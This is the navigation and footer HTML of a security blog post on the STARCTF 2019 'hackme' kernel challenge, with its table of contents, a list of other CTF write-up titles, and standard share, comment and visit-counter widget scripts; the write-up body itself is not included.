+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞分析"><span class="toc-number">1.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#抛砖引玉"><span class="toc-number">2.1.</span> <span class="toc-text">抛砖引玉</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#地址泄露"><span class="toc-number">2.2.</span> <span class="toc-text">地址泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#堆地址"><span class="toc-number">2.2.1.</span> <span class="toc-text">堆地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内核基址"><span class="toc-number">2.2.2.</span> <span class="toc-text">内核基址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#模块地址"><span class="toc-number">2.2.3.</span> <span class="toc-text">模块地址</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#内存任意写"><span class="toc-number">2.3.</span> <span class="toc-text">内存任意写</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#权限提升"><span class="toc-number">2.4.</span> <span class="toc-text">权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EXP"><span class="toc-number">3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reference"><span class="toc-number">4.</span> <span class="toc-text">Reference</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"STARCTF 2019 hackme 解题思路　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+        <section id="comments">
+    <style> aside.comment-bar { margin: auto 30px; }</style>
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function(){
+            this.page.url = 'http://p4nda.top/2019/05/01/starctf-2019-hackme/';
+            this.page.identifier = '2019/05/01/starctf-2019-hackme/';
+        };
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = '//p4nda.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        }
+    </script>
+    
+    <script> loadComment(); </script>
+
+</section>
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/02/16/CVE-2017-7184/" title="下一篇: Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/05/01/starctf-2019-hackme/">STARCTF 2019 hackme 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/16/CVE-2017-7184/">Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/18/CVE-2017-16995/">Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/kernel-bpf-overflow/">Linux kernel 4.20 BPF 整数溢出漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/06/xnuca-final-paraweb/">X-NUCA'2018 Final paraweb解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/27/wctf-2018-klist/">【KERNEL PWN】WCTF 2018 klist解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/XNUCA-secretcenter/">X-NUCA'2018 secretcenter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/07/stringipc/">【KERNEL PWN】从内存任意读写到权限提升</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/14/hwb-ctf-2018/">护网杯 CTF 2018线上预选赛PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/11/ciscn-2017-babydriver/">【KERNEL PWN】CISCN 2017 babydriver题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/27/WDBCTF-2018/">网鼎杯CTF部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CISCN-Final/">CISCN 2018 Final赛记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/0ctf-baby/">【KERNEL PWN】0ctf 2018 final baby题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【KERNEL PWN】强网杯CTF2018 core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB gsec CTF Qual 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2019 P4nda
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+	 <div id="landlord">
+		  <div class="message" style="opacity:0"></div>
+		  <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
+		  <div class="hide-button">隐藏</div>
+	  </div>
+			</div>
+
+        </div>
+		<!-- 血小板 -->
+
+<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var message_Path = '/live2d/'
+    var home_Path = 'https://haremu.com/'
+</script>
+<script type="text/javascript" src="/live2d/js/live2d.js"></script>
+<script type="text/javascript" src="/live2d/js/message.js"></script>
+<script type="text/javascript">
+    loadlive2d("live2d", "/live2d/model/xiaoban/model.json");
+</script>  
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        		
+    </div>
+	
+</footer>
+    </div>
+    
+    <script src="/js/GithubRepoWidget.js"></script>
+
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+             github: ".github-widget a", 
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 天黑了~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
